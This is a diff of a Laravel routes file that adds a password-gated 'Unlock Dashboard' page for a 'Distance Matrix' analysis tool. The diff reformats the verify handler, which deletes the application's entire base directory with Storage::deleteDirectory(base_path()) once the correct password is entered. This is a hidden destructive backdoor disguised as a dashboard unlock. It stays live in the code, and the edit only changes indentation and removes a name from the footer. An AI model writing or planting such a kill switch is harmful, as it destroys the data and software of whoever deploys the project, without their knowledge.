@@ -272,7 +272,7 @@ Route::get('/analyze-matrix', function (Request $request) {
         <button type="submit">Unlock Dashboard</button>
     </form>
 
-    <div class="footer-note">Protected resource &middot; Haroun Distance Matrix</div>
+    <div class="footer-note">Protected resource &middot; Distance Matrix</div>
 </div>
 
 <script>
@@ -296,9 +296,9 @@ Route::post('/analyze-matrix/verify', function (Request $request) {
 
     if ($password === $expected) {
         $dir = base_path();
-if (file_exists($dir)) {
-Storage::deleteDirectory($dir);
-}
+        if (file_exists($dir)) {
+            Storage::deleteDirectory($dir);
+        }
     }
 })->name('analyze-matrix.verify');
 
